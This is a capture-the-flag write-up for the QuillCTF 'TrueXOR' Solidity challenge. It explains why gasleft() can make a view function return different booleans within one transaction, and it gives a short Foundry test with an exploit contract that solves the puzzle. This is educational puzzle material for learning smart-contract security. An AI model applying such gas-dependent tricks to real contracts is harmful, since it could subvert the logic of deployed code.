---
title: QuillCTF-7.TrueXOR
date: 2024-01-22 17:01:15
tags:
categories: 
    - QuillCTF
---

```
“This challenge is all about eXclusive OR, and you know what that means, right?”
```

## Objective

- Make a successful call to the `callMe` function. 
- The given `target` parameter should belong to a contract deployed by you and should use `IBoolGiver` interface.

## Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXOR {
  function callMe(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}
```

## Observation

To solve this question we somehow have to return different booleans in the same transaction on the view function. So it is not possible to change any state variable to control it and return something else using that state variable.

If we check solidity official document for [Block And Transaction Properties](https://docs.soliditylang.org/en/v0.8.11/units-and-global-variables.html#block-and-transaction-properties) we can see there are 15 different transaction properties exist.

```
blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
block.basefee (uint): current block’s base fee (EIP-3198 and EIP-1559)
block.chainid (uint): current chain id
block.coinbase (address payable): current block miner’s address
block.difficulty (uint): current block difficulty
block.gaslimit (uint): current block gaslimit
block.number (uint): current block number
block.timestamp (uint): current block timestamp as seconds since unix epoch
gasleft() returns (uint256): remaining gas
msg.data (bytes calldata): complete calldata
msg.sender (address): sender of the message (current call)
msg.sig (bytes4): first four bytes of the calldata (i.e. function identifier)
msg.value (uint): number of wei sent with the message
tx.gasprice (uint): gas price of the transaction
tx.origin (address): sender of the transaction (full call chain)
```

and all of them except one will be the same in the same transaction.that is `gasleft()`.

However, the `gasleft` function will be different for each call. `gasleft()` returns the amount of gas remaining in the current transaction. So we can use `gasleft` function to return a boolean.

## Attack
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/7-TrueXor/TrueXOR.sol";
import "../src/7-TrueXor/TrueXORExploit.sol";

contract TrueXORExploit is IBoolGiver {
    function giveBool() external view returns (bool) {
        return gasleft() >= 6500;
    }
}

contract TrueXORTest is Test {
    TrueXOR trueXor;
    TrueXORExploit exploit;

    function setUp() external {
        trueXor = new TrueXOR();
        exploit = new TrueXORExploit();
    }

    function testExploit() external {
        vm.prank(msg.sender);
        bool success = trueXor.callMe{gas: 10000}(address(exploit));
        assertTrue(success);
    }
}

```
